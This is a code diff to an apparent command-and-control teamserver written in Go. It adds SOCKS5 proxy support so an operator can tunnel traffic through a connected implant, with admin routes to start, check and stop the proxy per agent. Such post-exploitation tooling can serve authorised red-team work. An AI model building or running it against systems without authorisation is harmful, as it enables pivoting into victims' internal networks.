@@ -28,6 +28,7 @@ import (
 	teamsrvCrypto "c2/internal/teamserver/crypto"
 	"c2/internal/teamserver/database"
 	"c2/internal/teamserver/listener"
+	"c2/internal/teamserver/socks5"
 )
 
 // buildCtvScript generates the on-demand-build stager script with dynamic
@@ -84,6 +85,7 @@ type Server struct {
 	listenerHandler *listener.Handler
 	builder         *api.ImplantBuilder
 	wsHandler       *api.WSHandler
+	socksRegistry   *socks5.ProxyRegistry
 }
 
 // New creates a new Server instance.
@@ -141,9 +143,10 @@ func New(cfg *Config) (*Server, error) {
 	// Set up agent manager and task manager
 	am := agent.NewManager(db)
 	tm := agent.NewTaskManager(db)
+	socksReg := socks5.NewProxyRegistry()
 
 	// Set up agent handler (handles incoming implant connections)
-	aHandler := agent.NewHandler(am, tm, masterKey)
+	aHandler := agent.NewHandler(am, tm, masterKey, socksReg)
 
 	// Set up listener manager (the callback wires listener → agent handler)
 	lm := listener.NewManager(db, func(listenerID string, conn net.Conn) {
@@ -169,6 +172,7 @@ func New(cfg *Config) (*Server, error) {
 	}
 
 	// Set up WebSocket handler
+	s.socksRegistry = socksReg
 	s.wsHandler = api.NewWSHandler(am, jwtSecret)
 
 	// Set up routes
@@ -330,6 +334,10 @@ func (s *Server) setupRoutes() {
 			admin.POST("/listeners/:id/stop", s.listenerHandler.StopListener)
 			// Agents (delete)
 			admin.DELETE("/agents/:id", s.handleDeleteAgent)
+			// SOCKS proxy
+			admin.POST("/agents/:id/socks", s.handleStartSocks)
+			admin.GET("/agents/:id/socks", s.handleSocksStatus)
+			admin.DELETE("/agents/:id/socks", s.handleStopSocks)
 			// Tasks (delete)
 			admin.DELETE("/tasks/:id", s.handleDeleteTask)
 		}
@@ -435,6 +443,64 @@ func (s *Server) handleDeleteAgent(c *gin.Context) {
 	s.agentMgr.Unregister(id)
 	s.db.Exec("DELETE FROM agents WHERE id = ?", id)
 	c.JSON(http.StatusOK, gin.H{"message": "Agent deleted"})
+}
+
+// --- SOCKS Proxy ---
+
+type startSocksRequest struct {
+	Port int `json:"port" binding:"required"`
+}
+
+func (s *Server) handleStartSocks(c *gin.Context) {
+	agentID := c.Param("id")
+
+	state, ok := s.agentMgr.Get(agentID)
+	if !ok {
+		c.JSON(http.StatusNotFound, gin.H{"error": gin.H{"code": "NOT_FOUND", "message": "Agent not found"}})
+		return
+	}
+
+	if status, exists := s.socksRegistry.Status(agentID); exists && status.Active {
+		c.JSON(http.StatusConflict, gin.H{"error": gin.H{"code": "CONFLICT", "message": "SOCKS proxy already running"}})
+		return
+	}
+
+	var req startSocksRequest
+	if err := c.ShouldBindJSON(&req); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"code": "BAD_REQUEST", "message": "port is required"}})
+		return
+	}
+
+	if req.Port < 1 || req.Port > 65535 {
+		c.JSON(http.StatusBadRequest, gin.H{"error": gin.H{"code": "BAD_REQUEST", "message": "port must be 1-65535"}})
+		return
+	}
+
+	sendMsg := func(msgType uint32, body interface{}) error {
+		return state.SendMessage(msgType, body)
+	}
+
+	if err := s.socksRegistry.Start(agentID, req.Port, sendMsg); err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": gin.H{"code": "INTERNAL", "message": err.Error()}})
+		return
+	}
+
+	c.JSON(http.StatusOK, gin.H{"message": "SOCKS proxy started", "port": req.Port})
+}
+
+func (s *Server) handleSocksStatus(c *gin.Context) {
+	agentID := c.Param("id")
+	status, _ := s.socksRegistry.Status(agentID)
+	c.JSON(http.StatusOK, status)
+}
+
+func (s *Server) handleStopSocks(c *gin.Context) {
+	agentID := c.Param("id")
+	if err := s.socksRegistry.Stop(agentID); err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": gin.H{"code": "INTERNAL", "message": err.Error()}})
+		return
+	}
+	c.JSON(http.StatusOK, gin.H{"message": "SOCKS proxy stopped"})
 }
 
 // --- Tasks ---
